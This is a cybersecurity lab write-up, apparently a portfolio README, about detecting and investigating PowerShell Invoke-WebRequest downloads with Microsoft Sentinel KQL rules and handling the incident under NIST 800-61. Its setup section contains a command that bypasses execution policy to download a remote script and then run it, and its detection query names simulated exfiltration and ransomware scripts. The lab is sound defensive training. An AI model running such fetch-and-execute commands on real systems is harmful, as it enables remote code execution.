<p align="center">
  <a href="https://github.com/Samuel-Cavada" target="_blank">
    <img src="https://img.shields.io/badge/Back_to_Main_Page-000000?style=for-the-badge&logo=github&logoColor=white" alt="Back to Main Page"/>
  </a>
</p>

# Scenario 2: PowerShell Suspicious Web Request

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Azure%20Sentinel-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white" alt="Cloud Platform" />
  <img src="https://img.shields.io/badge/OS-Windows%2010-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="OS" />
  <img src="https://img.shields.io/badge/Tool-Microsoft%20Sentinel-00B388?style=for-the-badge&logo=microsoftazure&logoColor=white" alt="Tool" />
  <img src="https://img.shields.io/badge/Tool-Microsoft%20Defender%20for%20Endpoint-2C5EA8?style=for-the-badge&logo=microsoftdefender&logoColor=white" alt="Tool" />
  <img src="https://img.shields.io/badge/Focus-Post%20Exploitation%20Detection-orange?style=for-the-badge" alt="Focus Area" />
</p>

---

## 🧾 Explanation

Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet.

---

## 📌 Project Objective

> Detect and investigate the use of PowerShell's `Invoke-WebRequest` for downloading files from the internet—an activity often used by attackers during post-exploitation phases. This scenario involves creating an analytics rule in Sentinel and working the resulting incident to closure using the NIST 800-61 framework.

---

## 🧰 Tools & Technologies

- **Platform:** Azure
- **OS:** Windows 10
- **Tools:** Microsoft Sentinel, Microsoft Defender for Endpoint, PowerShell
- **Languages/Scripts:** PowerShell, KQL

---

## 🧠 Skills Gained / Focus Areas

- Detected use of `Invoke-WebRequest` via process telemetry
- Created a Sentinel alert rule to detect suspicious PowerShell usage
- Investigated execution of downloaded scripts
- Applied entity mapping and incident triage methodology

---

## 🧪 Environment Setup

> Onboarded Windows 10 VM to Microsoft Defender for Endpoint. Ran the following command to simulate malicious activity:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

![Environment Setup](assets/images/setup.jpg)

---

## 🛠️ Walkthrough

1. **Step 1: Create Alert Rule**
2. **Step 2: Trigger Alert**
3. **Step 3: Work Incident**
4. **Step 4: Cleanup**

---

### ✅ Step 1: Create Alert Rule

KQL used to detect suspicious PowerShell downloads:

```kql
let TargetHostname = "cavada-cyber-pc"; 
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

**Analytics Rule Settings:**

- Run every 4 hours
- Lookup data for last 24 hours
- Map entities:
  - **Account:** AccountName
  - **Host:** DeviceName
  - **Process:** ProcessCommandLine
- Automatically create Incident
- Stop running query after alert is generated
- Group alerts into one Incident per 24 hours

---

### ✅ Step 2: Trigger Alert

- Simulated execution of `Invoke-WebRequest` via PowerShell
- Alert triggered and incident created in Sentinel
- Incident visible in: **Threat Management → Incidents**

---

### ✅ Step 3: Work Incident

Followed **NIST 800-61** Lifecycle:

**Preparation:**
- Roles, logging tools, and VM setup confirmed

**Detection & Analysis:**
- Incident observed: "Josh - PowerShell Suspicious Web Request"
- Multiple scripts downloaded via PowerShell:
  - `https://raw.githubusercontent.com/.../eicar.ps1`
  - `https://raw.githubusercontent.com/.../portscan.ps1`

Checked if any downloaded scripts were executed:

```kql
let TargetHostname = "cavada-cyber-pc";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```

**Findings:**

- `eicar.ps1` and `portscan.ps1` executed by `labuser`
- `eicar.ps1` simulated malware signature
- `portscan.ps1` launched internal port scan

**Containment, Eradication, and Recovery:**

- VM isolated using MDE
- Anti-malware scan performed
- Files removed and system returned to normal state

**Post-Incident:**

- Contacted user: they reported trying to install free software, followed by black screen
- Scripts confirmed to have executed via Defender logs
- Malware team reviewed scripts:
  - `portscan.ps1`: scanned internal IPs for open ports
  - `eicar.ps1`: created AV test file
  - `exfiltratedata.ps1`: simulated data exfiltration to Azure Blob
  - `pwncrypt.ps1`: simulated ransomware + ransom note creation
- User was retrained on cyber hygiene; KnowBe4 training package upgraded

**Closure:**

- Incident marked **True Positive**
- KQL queries and notes documented in Sentinel
- Case closed

---

## 📝 Timeline Summary and Findings

- Alert triggered by `Invoke-WebRequest` detection
- Multiple suspicious scripts were downloaded and run
- Executed scripts confirmed through process telemetry
- Incident triaged and remediated successfully

---

## 📎 References

- [MITRE ATT&CK: T1059.001 – PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [Advanced Hunting – DeviceProcessEvents]()
